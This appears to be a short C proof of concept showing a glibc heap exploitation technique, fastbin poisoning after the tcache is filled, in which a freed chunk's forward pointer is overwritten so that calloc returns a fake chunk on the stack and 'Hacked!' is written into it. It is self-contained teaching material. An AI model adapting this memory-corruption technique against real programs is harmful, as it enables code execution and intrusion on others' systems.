#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "malloc_struct.h"

int main(void){
	void *m, *victim;
	malloc_chunk *c;
	malloc_chunk fc __attribute__((aligned(16))) = {
		.size = 0x21, .mem = "Hello"
	};

	printf("&fc    : %p\nfc.mem = %s\n\n", &fc, fc.mem);

	m = malloc(0x18);
	c = mem2chunk(m);
	for(int i=0; i<7; i++)
		free(calloc(1, 0x18));

	free(m);			// to fastbin
	puts("Exploit!");
	c->fd = (void*)&fc;		// vuln

	calloc(1, 0x18);		// from fastbin
	victim = calloc(1, 0x18);	// alloc fc from fastbin
	strcpy(victim, "Hacked!");

	printf("victim = %p\nfc.mem = %s\n", victim, fc.mem);
}
